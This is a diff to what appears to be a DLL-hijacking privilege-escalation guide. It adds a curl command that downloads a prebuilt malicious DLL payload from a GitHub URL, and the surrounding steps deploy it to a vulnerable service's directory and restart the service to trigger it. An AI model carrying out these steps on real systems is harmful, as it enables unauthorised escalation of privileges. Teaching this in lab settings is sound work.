@@ -739,7 +739,17 @@ A vulnerable service attempts to load a missing DLL, which allows us to escalate
        i686-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll
        ```
 
-3. **Deploy the Malicious DLL:**
+3. **Optional: Download the DLL Payload:**
+
+   - If you already have the DLL payload hosted somewhere, you can download it using the following `curl` command:
+
+     ```bash
+     curl -o "C:\temp\hijackme.dll" https://raw.githubusercontent.com/Ardemium/InsideJob/refs/heads/main/payloads/hijackme.dll
+     ```
+
+     > **Note:** Modify the destination path (`"C:\temp\hijackme.dll"`) to your desired location and file name, if necessary.
+
+4. **Deploy the Malicious DLL:**
 
    - Copy the compiled `hijackme.dll` to the vulnerable service's directory:
 
@@ -747,7 +757,7 @@ A vulnerable service attempts to load a missing DLL, which allows us to escalate
      copy Z:\hijackme.dll "C:\temp"
      ```
 
-4. **Restart the Service:**
+5. **Restart the Service:**
 
    - Restart the service to trigger the malicious DLL:
 
